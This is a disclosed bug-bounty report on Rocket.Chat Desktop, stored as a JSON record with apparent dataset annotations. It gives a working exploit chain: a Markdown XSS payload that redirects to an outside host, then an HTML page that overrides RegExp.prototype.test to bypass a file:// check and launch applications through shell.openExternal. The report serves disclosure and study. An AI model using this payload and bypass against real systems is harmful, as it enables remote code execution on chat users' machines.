{
  "reported_to": "Rocket.Chat",
  "reported_by": "mattaustin ",
  "title": "Remote Code Execution in Rocket.Chat Desktop",
  "content": "\nSummary: The Markdown parser can be tricked into allowing arbitrary Javascript leading to \"remote code execution\".\nDescription:\nBy combining the \"link\" and inline code block we can trick the parser into breaking out of the current HTML attribute.\nThis allows us to control other attributes of the tag and trigger javascript events.\nCode 94 Bytes\n1[ hax ](http://hax//onmouseover=location='https://maustin.net/hax/rocket/hack.html';\"`hax`zzz)\nbecomes\nCode 159 Bytes\n1<a href=\"&lt;a href=\" http:=\"\" hax=\"\" onmouseover=\"location='https://maustin.net/hax/rocket/hack.html';&quot;&quot;\" target=\"_blank\" rel=\"noopener noreferrer\">\nThis is a simple redirect to: https://maustin.net/hax/rocket/hack.html\nFrom this point the goal is to get the application to call shell.openExternal(href); with a URL we control. Thats because:\n\"open 'file://localhost/Volumes/Macintosh HD/foo.txt'\" opens the document\nin the default application for its type (as determined by LaunchSer-\nvices).\nNote: For this demo I point to file:///Applications/Calculator.app however if you point to a public NFS or SMB server on windows this executable can be controlled by the attacker. (example at: file:///net/192.241.239.91/var/nfs/general/hack2.app)\nIn https://github.com/RocketChat/Rocket.Chat.Electron/blob/master/src/public/preload.js#L45 all links are hooked and some patter matching is used to check before firing them off to shell.openExternal(href);\nNormally preload javascript is an \"isolated scope\" in this case however the code is directly attached to the user controlled DOM as the \"window.onload\" handler. This means we can overload some global objects and methods including the RegExp.prototype.test method. Now we can bypass the file:\\/\\/ check send our application path to openExternal.\nCode 793 Bytes\n1<!DOCTYPE html>\n2<html>\n3    <head>\n4      <script>\n5        RegExp.prototype.test = new Proxy(RegExp.prototype.test, {\n6          apply: function(target, thisArg, argumentsList) {\n7            console.log(thisArg.source);\n8          console.log(argumentsList[0]);\n9          if((thisArg.source == '^file:\\\\/\\\\/.+') && (argumentsList[0] === 'file:///Applications/Calculator.app')){\n10            return false;\n11          }\n12          return Reflect.apply(target, thisArg, argumentsList)\n13          }\n14        });\n15        setTimeout(()=>{\n16            a = document.createElement(\"A\")\n17            a.href=\"file:///Applications/Calculator.app\"\n18            document.body.appendChild(a)\n19            a.click()\n20        }, 3000);\n21      </script>\n22    </head>\n23    <body>\n24     <h1>3...2...1...\ud83d\ude80</h1>\n25    </body>\n26</html>\nReleases Affected:\n= 2.9.0\nSteps To Reproduce (from initial installation to vulnerability):\nCreate a new channel to test in.\nSend the following snippet of markdown:\nCode 94 Bytes\n1[ hax ](http://hax//onmouseover=location='https://maustin.net/hax/rocket/hack.html';\"`hax`zzz)\nMove your mouse over the link you just send and\nSupporting Material/References:\nhttps://youtu.be/HPlwlc2J-LQ\nSuggested mitigation\nThe markdown parser needs a little love to prevent the initial xss.\nI believe you should be able to use something like window.addEventListener(\"load\", .. to execute the checks in the proper scope.\n\n",
  "severity": [
    7.0,
    8.9
  ],
  "bounty": null,
  "weaknesses": [
    "Code Injection"
  ],
  "screenshots": {},
  "disclosed_date": 1537322400,
  "report_url": "https://hackerone.com/reports/276031",
  "is_multi_component": true,
  "complexity": "HIGH",
  "novelty": "HIGH",
  "vuln_category": "WEB_APP",
  "steps": [
    [
      1,
      "Create a new channel in Rocket.Chat"
    ],
    [
      2,
      "Send the following markdown snippet in the channel: [ hax ](http://hax//onmouseover=location='https://maustin.net/hax/rocket/hack.html';\"`hax`zzz)"
    ],
    [
      3,
      "Move mouse over the link to trigger the redirect to the malicious page"
    ],
    [
      4,
      "The malicious page then overrides RegExp.prototype.test to bypass security checks and executes shell.openExternal with a controlled file path"
    ]
  ],
  "vuln_description": "The vulnerability involves a chain of exploits starting with a Markdown parser flaw that allows XSS, leading to remote code execution by manipulating the application's link handling mechanism to execute arbitrary applications via shell.openExternal.",
  "reason": "This attack requires deep understanding of multiple components: Markdown parsing quirks, DOM manipulation, JavaScript prototype pollution, and the specific implementation of Rocket.Chat's link handling. The interaction between these components is non-obvious and requires precise manipulation of application state.",
  "new_complexity": "HIGH",
  "requires_code": false,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null,
  "injection_metadata": {
    "reasoning": "The vulnerability involves injecting a malicious Markdown payload into a chat message parameter (a user-controlled input field). The methodology's 'simple payload' approach could detect this because:\n1. The message content is an injectable parameter identifiable through HTTP logging.\n2. The payload uses basic Markdown syntax manipulation (attribute escaping) which falls under 'context positioning for XSS' in simple payload lists.\n3. Execution is detectable through regular navigation (viewing the chat triggers stored XSS).\nWhile the full exploit chain requires additional JS manipulation, the initial XSS vector itself qualifies as a simple injection detectable via generic payload testing.",
    "is_simple_injection": true
  },
  "authnz_metadata": {
    "reason": "The vulnerability involves a markdown parser flaw leading to XSS and RCE, which is not directly related to authentication or authorization bypasses. The methodology focuses on testing (user_session, action, resource_id) tuples for AuthN/AuthZ issues, not parser or XSS vulnerabilities.",
    "is_detectable": false
  }
}